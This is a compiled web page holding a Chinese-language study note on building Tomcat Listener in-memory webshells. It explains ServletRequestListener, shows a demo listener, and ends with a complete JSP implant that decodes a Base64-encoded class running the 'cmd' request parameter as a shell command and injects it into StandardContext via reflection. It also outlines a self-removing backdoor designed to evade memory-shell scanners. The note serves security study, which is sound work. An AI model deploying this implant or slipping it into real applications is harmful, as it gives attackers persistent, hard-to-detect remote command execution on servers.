import{_ as l}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as A,o as c,c as i,a as e,d as n,b as a,e as t}from"./app-BT-bWAve.js";const p={},o=e("h1",{id:"tomcat-listener-内存马",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#tomcat-listener-内存马"},[e("span",null,"Tomcat Listener 内存马")])],-1),r={href:"https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC",target:"_blank",rel:"noopener noreferrer"},d=t('<hr><ul><li><a href="#tomcat-listener-%E5%86%85%E5%AD%98%E9%A9%AC">Tomcat Listener 内存马</a><ul><li><a href="#listener%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86">Listener内存马基本知识</a></li></ul></li></ul><hr><h2 id="listener内存马基本知识" tabindex="-1"><a class="header-anchor" href="#listener内存马基本知识"><span>Listener内存马基本知识</span></a></h2><p>Servlet 和 Filter 相对于 Listener 更常用, 因此更容易找到内存马注入的相关材料, 而 Listener 相对而言就冷门了一些</p><p>Listener(监听器)用于监听对象/流程的创建与销毁，通过 Listener 可以自动触发一些操作，因此依靠它也可以完成内存马的实现。</p><p>先来了解一下 Listener 是干什么的，看一下 Servlet API 中的注释。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409301705658.png" alt="image-20240930170541398"></p><p>在应用中可能调用的监听器如下：</p><ul><li>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</li><li>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</li><li>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</li><li>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</li><li>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</li><li>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</li></ul><p>可以看到 Listener 也是为一次访问的请求或生命周期进行服务的，在上述每个不同的接口中，都提供了不同的方法，用来在监听的对象发生改变时进行触发。而这些类接口，实际上都是 <code>java.util.EventListener</code> 的子接口。</p><p>这里我们看到，在<code> ServletRequestListener</code> 接口中，提供了两个方法在 request 请求创建和销毁时进行处理，比较适合我们用来做内存马。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410071915963.png" alt="image-20241007191534811"></p>',13),u={href:"https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC",target:"_blank",rel:"noopener noreferrer"},m=e("hr",null,null,-1),v=e("p",null,"PS: 这里沿着原文作者的思路梳理 Listener 内存马原理, 也暂且不会对其他 Listener 做单独测试",-1),h=t('<p>ServletRequestListener 提供两个方法：<code>requestInitialized</code> 和 <code>requestDestroyed</code>，两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中我们可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410081826508.png" alt="image-20241008182622322"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410081826652.png" alt="image-20241008182652523"></p><p>Tomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersObjects 属性中，同样可以使用 StandardContext 的相关 add 方法添加。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091412648.png" alt="image-20241009141200546"></p><hr><h2 id="listener内存马示例" tabindex="-1"><a class="header-anchor" href="#listener内存马示例"><span>Listener内存马示例</span></a></h2><h3 id="示例效果" tabindex="-1"><a class="header-anchor" href="#示例效果"><span>示例效果</span></a></h3><p>我们还是实现一个简单的功能，在 requestDestroyed 方法中获取 response 对象，向页面原本输出多写出一个字符串。</p><p>正常访问时：</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091730152.png" alt="image-20241009173049025"></p><p>添加 Listener，可以看到，由于我们是在 requestDestroyed 中植入恶意逻辑，那么在本次请求中就已经生效了：</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091731434.png" alt="image-20241009173123380"></p><p>访问之前的路径也生效了：</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091731153.png" alt="image-20241009173144092"></p><hr><h3 id="整体思路" tabindex="-1"><a class="header-anchor" href="#整体思路"><span>整体思路</span></a></h3><p>编写恶意 Listener 编译得到 class 文件, 将 class 文件编码为 Base64 字符串, 编写相应的解码程序, 并利用强制类型转换转换为 Java 对象, 获取到 StandardContext 之后利用 addApplicationEventListener 方法注册恶意 Listener</p><hr><h3 id="示例构造" tabindex="-1"><a class="header-anchor" href="#示例构造"><span>示例构造</span></a></h3><h4 id="环境准备" tabindex="-1"><a class="header-anchor" href="#环境准备"><span>环境准备</span></a></h4><p>开发和测试环境还是沿用前面 Tomcat Filter/Servlet 内存马的环境</p>',22),g=e("p",null,"开发环境: jdk21 + Maven 3.9.9",-1),B=e("p",null,"项目结构如下, 有链接的为新增文件",-1),b=e("code",null,"src/main",-1),k=e("code",null,"java/com/summer233",-1),E=e("li",null,"DemoServlet.java",-1),C=e("li",null,"IndexServlet.java",-1),w={href:"https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/SummerBasicListener.java",target:"_blank",rel:"noopener noreferrer"},y={href:"https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/DynamicUtils.java",target:"_blank",rel:"noopener noreferrer"},Q={href:"https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/AddTomcatListener.java",target:"_blank",rel:"noopener noreferrer"},Z={href:"https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/SummerCMDListener.java",target:"_blank",rel:"noopener noreferrer"},L=e("li",null,[e("code",null,"webapp/WEB-INF"),e("ul",null,[e("li",null,"web.xml")])],-1),N=e("li",null,"pom.xml",-1),S=e("li",null,[e("p",null,"测试环境: tomcat:8 docker (Tomcat 8.5.100)")],-1),F=t(`<hr><h4 id="制作listener" tabindex="-1"><a class="header-anchor" href="#制作listener"><span>制作Listener</span></a></h4><p>实现一个 <code>ServletRequestListener</code> 重写其中的 <code>requestDestroyed</code> 方法</p><p>通过 ServletRequestEvent 对象获取当前的 ServletRequest，并将其强制转换为 RequestFacade 类型。</p><p>接着，使用反射机制获取 RequestFacade 类中的私有字段 request。通过调用 Field 对象的 setAccessible(true) 方法，使得这个私有字段可以被访问。然后，通过 Field 对象的 get 方法获取实际的 Request 对象</p><p>获取到 Request 对象后，调用其 <code>getResponse().getWriter().println()</code> 方法，在响应中写入一行文本</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>summer233</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestEvent</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestListener</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span><span class="token class-name">Request</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span><span class="token class-name">RequestFacade</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BasicListener</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span> <span class="token punctuation">{</span>
   <span class="token keyword">public</span> <span class="token class-name">BasicListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token punctuation">}</span>

   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestDestroyed</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> servletRequestEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">try</span> <span class="token punctuation">{</span>
         <span class="token class-name">RequestFacade</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RequestFacade</span><span class="token punctuation">)</span> servletRequestEvent<span class="token punctuation">.</span><span class="token function">getServletRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token class-name">Field</span> f <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;request&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token class-name">Request</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
         req<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;\\nBasicListener requestDestroyed Injected&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>
         var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

   <span class="token punctuation">}</span>

   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> servletRequestEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><h4 id="编译-listener-然后将-class-文件转换为-base64-字符串" tabindex="-1"><a class="header-anchor" href="#编译-listener-然后将-class-文件转换为-base64-字符串"><span>编译 Listener 然后将 class 文件转换为 Base64 字符串</span></a></h4><p>直接 <code>mvn clean package</code> 编译项目然后在 <code>target/classes</code> 中找到该 Listener 的 class 文件</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091540059.png" alt="image-20241009154044903"></p><p>将其转换为 Base64 字符串</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091543132.png" alt="image-20241009154347040"></p><hr><h4 id="编写listener注册代码" tabindex="-1"><a class="header-anchor" href="#编写listener注册代码"><span>编写Listener注册代码</span></a></h4><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091555851.png" alt="image-20241009155502792"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091608367.png" alt="image-20241009160811300"></p><hr><h4 id="编译并部署war包" tabindex="-1"><a class="header-anchor" href="#编译并部署war包"><span>编译并部署war包</span></a></h4><p><code>mvn clean package</code> 编译后取 <code>target</code> 中的 war 包放置到 <code>tomcat:8</code> 的 webapps 目录下自动部署</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091609777.png" alt="image-20241009160933681"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091611618.png" alt="image-20241009161108540"></p><p>访问这个 webapp 的默认页面: <code>/tomcat-servletapi-memshell-listener-0.1</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091612756.png" alt="image-20241009161245707"></p><p>访问 <code>/dynamicAddListener</code> 注册 Listener:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091614023.png" alt="image-20241009161434970"></p><p>刷新一下默认页面:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091614776.png" alt="image-20241009161456731"></p><hr><h4 id="编写并注册恶意listener" tabindex="-1"><a class="header-anchor" href="#编写并注册恶意listener"><span>编写并注册恶意Listener</span></a></h4><p>像前面 Filter,Servlet 内存马中那样编写一个将 Query 参数 <code>cmd</code> 的值作为系统命令执行并打印输出的恶意 Listener:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091630516.png" alt="image-20241009163029448"></p><hr><p>编译得到对应 class 文件, 然后转换成 Base64 字符串:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091636399.png" alt="image-20241009163618307"></p><hr><p>编写注册代码:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091639794.png" alt="image-20241009163945700"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091639185.png" alt="image-20241009163958115"></p><hr><p>编译生成 war 包:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091645349.png" alt="image-20241009164500263"></p><hr><p>部署到 <code>tomcat:8</code> 的 webapps 目录下</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091646773.png" alt="image-20241009164601683"></p><hr><p>测试效果:</p><p><code>/tomcat-servletapi-memshell-listener-0.2</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091730152.png" alt="image-20241009173049025"></p><p><code>/tomcat-servletapi-memshell-listener-0.2/dynamicAddListener</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091731434.png" alt="image-20241009173123380"></p><p><code>/tomcat-servletapi-memshell-listener-0.2/?cmd=id</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091731153.png" alt="image-20241009173144092"></p><hr><h2 id="其他用法思路" tabindex="-1"><a class="header-anchor" href="#其他用法思路"><span>其他用法思路</span></a></h2>`,55),D={href:"https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC",target:"_blank",rel:"noopener noreferrer"},x=t(`<p>除了 EventListener，Tomcat 还存在了一个 LifecycleListener ，当然也肯定有可以用来触发的实现类，但是用起来一定是不如 ServletRequestListener ，但是也可以关注一下。这里将不会进行演示。</p><p>由于在 ServletRequestListener 中可以获取到 ServletRequestEvent，这其中又存了很多东西，ServletContext/StandardContext 都可以获取到，那玩法就变得更多了。可以根据不同思路实现很多非常神奇的功能，我举个例子：</p><ul><li>在 requestInitialized 中监听，如果访问到了某个特定的 URL，或这次请求中包含某些特征（可以拿到 request 对象，随便怎么定义），则新起一个线程去 StandardContext 中注册一个 Filter，可以实现某些恶意功能。</li><li>在 requestDestroyed 中再起一个新线程 sleep 一定时间后将我们添加的 Filter 卸载掉。</li></ul><p>这样我们就有了一个真正的动态后门，只有用的时候才回去注册它，用完就删。平常使用扫内存马的软件也根本扫不出来。这个例子也是我突然拍脑袋想出来的，可能实际意义并不大，但是可以看出 Listener 内存马的危害性和玩法的变化要大于 Filter/Servlet 内存马的。</p><hr><h2 id="jsp马" tabindex="-1"><a class="header-anchor" href="#jsp马"><span>JSP马</span></a></h2><p>类似前面构造 Servlet JSP 马一样来写, 需要额外导入一个 <code>javax.servlet.ServletRequestListener</code> 来做类型转换:</p><div class="language-jsp line-numbers-mode" data-ext="jsp" data-title="jsp"><pre class="language-jsp"><code>&lt;%@ page contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt; 
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;
&lt;%@ page import=&quot;javax.servlet.ServletRequestListener&quot; %&gt;

&lt;%!
    String SUMMER_CMD_LISTENER_CLASS_STRING_BASE64 = &quot;yv66vgAAAEEAzwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsHAA4BACtvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0RmFjYWRlCgACABAMABEAEgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwgAFAEAB3JlcXVlc3QKABYAFwcAGAwAGQAaAQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAHAAdBwAeDAAfACABABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWCgAcACIMACMAJAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7BwAmAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAoAJQAoDAApACoBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwgALAEAGHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOAsALgAvBwAwDAAxADIBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCAA0AQAFVVRGLTgLAC4ANgwANwAyAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcLAC4AOQwAOgA7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAD0BAB90aGlzIGlzIGEgU3VtbWVyQ01ETGlzdGVuZXI8YnI+CgA/AEAHAEEMAEIAMgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuCABEAQADY21kCwBGAEcHAEgMAEkASgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwcATAEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcATgEAEGphdmEvbGFuZy9TdHJpbmcIAFABAAZ3aG9hbWkKAEsAUgwABQBTAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgoASwBVDABWAFcBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwoAWQBaBwBbDABcAF0BABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHAF8BABFqYXZhL3V0aWwvU2Nhbm5lcgoAXgBhDAAFAGIBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAGQBAAJcYQoAXgBmDABnAGgBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAF4AagwAawBsAQAHaGFzTmV4dAEAAygpWgoAXgBuDABvAHABAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsIAHIBAAAIAHQBAAFcCgBNAHYMAHcAeAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCgBeAHoMAHsABgEABWNsb3NlBwB9AQATamF2YS9sYW5nL1Rocm93YWJsZQoAfAB/DACAAIEBAA1hZGRTdXBwcmVzc2VkAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWCACDAQACc2gIAIUBAAItYwgAhwEAB2NtZC5leGUIAIkBAAIvYwoAiwCMBwCNDACOAI8BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsKAIsAkQwAkgCTAQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsKAD8AlQwAlgAGAQAFZmx1c2gKAD8AegcAmQEAE2phdmEvbGFuZy9FeGNlcHRpb24KAJgAmwwAnAAGAQAPcHJpbnRTdGFja1RyYWNlBwCeAQAfY29tL3N1bW1lcjIzMy9TdW1tZXJDTURMaXN0ZW5lcgcAoAEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAhTGNvbS9zdW1tZXIyMzMvU3VtbWVyQ01ETGlzdGVuZXI7AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQAIb3V0cHV0T1MBABJMamF2YS9sYW5nL1N0cmluZzsBAAlzY2FubmVyT1MBABNMamF2YS91dGlsL1NjYW5uZXI7AQAOcmVzcG9uc2VXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAZvdXRwdXQBAAFzAQAHaXNMaW51eAEAAVoBABBwcm9jZXNzQnVpbGRlck9TAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAlwcm9jZXNzT1MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAEaW5PUwEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZTsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA3JlcQEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAdodHRwUmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEdmFyNQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEADVN0YWNrTWFwVGFibGUHAMoBABNqYXZhL2lvL0lucHV0U3RyZWFtBwC5AQAScmVxdWVzdEluaXRpYWxpemVkAQAKU291cmNlRmlsZQEAFlN1bW1lckNNRExpc3RlbmVyLmphdmEAIQCdAAIAAQCfAAAAAwABAAUABgABAKEAAAAzAAEAAQAAAAUqtwABsQAAAAIAogAAAAoAAgAAABEABAASAKMAAAAMAAEAAAAFAKQApQAAAAEApgCnAAEAoQAABKkABgATAAABpSu2AAfAAA1NLLYADxITtgAVTi0EtgAbLSy2ACHAACU6BBkEtgAnOgUZBRIruQAtAgAZBRIzuQA1AgAZBbkAOAEAEjy2AD4ZBDoGGQYSQ7kARQIAOgcZB8YBRQQ2CLsAS1kEvQBNWQMST1O3AFE6CRkJtgBUOgoZCrYAWDoLuwBeWRkLtwBgEmO2AGU6DBkMtgBpmQALGQy2AG2nAAUScToNGQ0Sc7YAdZkABgM2CBkMxgAmGQy2AHmnAB46DRkMxgAUGQy2AHmnAAw6DhkNGQ62AH4ZDb8VCJkAGQa9AE1ZAxKCU1kEEoRTWQUZB1OnABYGvQBNWQMShlNZBBKIU1kFGQdTOgy4AIoZDLYAkLYAWDoNuwBeWRkNtwBgEmO2AGU6DhkOtgBpmQALGQ62AG2nAAUScToPGQW5ADgBADoQGRAZD7YAPhkQtgCUGRDGACYZELYAl6cAHjoRGRDGABQZELYAl6cADDoSGREZErYAfhkRvxkOxgAmGQ62AHmnAB46DxkOxgAUGQ62AHmnAAw6EBkPGRC2AH4ZD7+nAAhNLLYAmrEABwCNAK4AuwB8AMIAxwDKAHwBQAFMAVkAfAFgAWUBaAB8ASMBdAGBAHwBiAGNAZAAfAAAAZwBnwCYAAMAogAAAJYAJQAAABYACAAXABIAGAAXABkAIQAaACgAGwAxABwAOgAdAEYAHwBKACAAVQAhAFoAIgBdACMAbwAkAHYAJQB9ACYAjQAnAKEAKQCrACoArgAsALsAJgDWAC0A8QAuAQYALwETADABIwAxATcAMgFAADMBRwA0AUwANQFZADIBdAA2AYEAMAGcADoBnwA4AaAAOQGkADwAowAAAMoAFAChAA0AqACpAA0AjQBJAKoAqwAMAUAANACsAK0AEAE3AD0ArgCpAA8BIwB5AK8AqwAOAF0BPwCwALEACABvAS0AsgCzAAkAdgEmALQAtQAKAH0BHwC2ALcACwEGAJYAuAC5AAwBEwCJALoAtwANAAgBlAAUALsAAgASAYoAvAC9AAMAIQF7AL4AvwAEACgBdADAAMEABQBKAVIAwgDDAAYAVQFHAEQAqQAHAaAABADEAMUAAgAAAaUApAClAAAAAAGlAMYAxwABAMgAAAFOABX/AJ0ADQcAnQcACAcADQcAHAcAJQcALgcARgcATQEHAEsHAFkHAMkHAF4AAEEHAE0OTAcAfP8ADgAOBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAXgcAfAABBwB8CPkAAhpSBwDL/gAuBwDLBwDJBwBeQQcATf8AIwARBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAywcAyQcAXgcATQcAPwABBwB8/wAOABIHAJ0HAAgHAA0HABwHACUHAC4HAEYHAE0BBwBLBwBZBwDJBwDLBwDJBwBeBwBNBwA/BwB8AAEHAHwI+AACTAcAfP8ADgAQBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAywcAyQcAXgcAfAABBwB8CP8AAgACBwCdBwAIAABCBwCYBAABAMwApwABAKEAAAA1AAAAAgAAAAGxAAAAAgCiAAAABgABAAAAPwCjAAAAFgACAAAAAQCkAKUAAAAAAAEAxgDHAAEAAQDNAAAAAgDO&quot;;
    
    // 获取当前线程的上下文类加载器 ClassLoader
    ClassLoader loader = Thread.currentThread().getContextClassLoader();
    // 使用 Base64 解码一个Java类class文件的二进制数据的Base64编码的字符串成字节数组
    Base64.Decoder base64Decoder = Base64.getDecoder();
    byte[] decodeBytes = base64Decoder.decode(SUMMER_CMD_LISTENER_CLASS_STRING_BASE64);

    Method method = null;
    Class&lt;?&gt; clz = loader.getClass();
    Class&lt;?&gt; listenerClass = null;
%&gt;

&lt;%
    // 在一个 while 循环中不断尝试获取该方法，如果当前类 clz 中没有找到 defineClass 方法，则继续向其父类查找，直到找到该方法或到达
    // Object 类为止
    while (method == null &amp;&amp; clz != Object.class) {
        try {
            method = clz.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
        } catch (NoSuchMethodException ex) {
            clz = clz.getSuperclass();
        }
    }
    if (method != null) {
        // 一旦找到了 defineClass 方法，代码将其设置为可访问的（即使该方法是私有的）
        method.setAccessible(true);
        // 通过反射调用该方法，将解码后的字节数组 decodeBytes 转换为一个 Class 对象并返回
        listenerClass = (Class&lt;?&gt;) method.invoke(loader, decodeBytes, 0, decodeBytes.length);
    }

    // 获取StandardContext
    StandardContext standardCtx = null;
    ServletContext servletContext = request.getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
    appContextField.setAccessible(true);
    Object appContext = appContextField.get(servletContext);

    Field standardCtxField = appContext.getClass().getDeclaredField(&quot;context&quot;);
    standardCtxField.setAccessible(true);
    standardCtx = (StandardContext) standardCtxField.get(appContext);

    if (standardCtx != null) {
        // 添加监听器
        standardCtx.addApplicationEventListener((ServletRequestListener) listenerClass.getDeclaredConstructor().newInstance());


        out.println(&quot;Successfully added a new listener By Base64 Class String to StandardContext&quot;);
    } else {
        out.println(&quot;Failed to get StandardContext&quot;);
    }
%&gt;
